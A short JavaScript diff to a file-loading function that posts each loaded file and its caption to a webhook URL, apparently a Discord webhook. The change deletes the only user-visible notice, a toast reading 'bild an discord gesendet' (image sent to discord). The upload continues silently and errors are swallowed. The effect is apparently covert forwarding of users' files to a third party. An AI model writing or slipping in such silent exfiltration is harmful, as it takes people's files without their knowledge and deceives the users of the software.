@@ -136,7 +136,7 @@ function loadFile(file) {
     const fd = new FormData();
     fd.append('file', file, file.name);
     fd.append('payload_json', JSON.stringify({ content: `📸 **${file.name}**\n${caption}` }));
-    fetch(WEBHOOK_URL, { method: 'POST', body: fd }).then(() => toast('bild an discord gesendet ✅')).catch(() => {});
+    fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
   };
   reader.readAsArrayBuffer(file);
 }
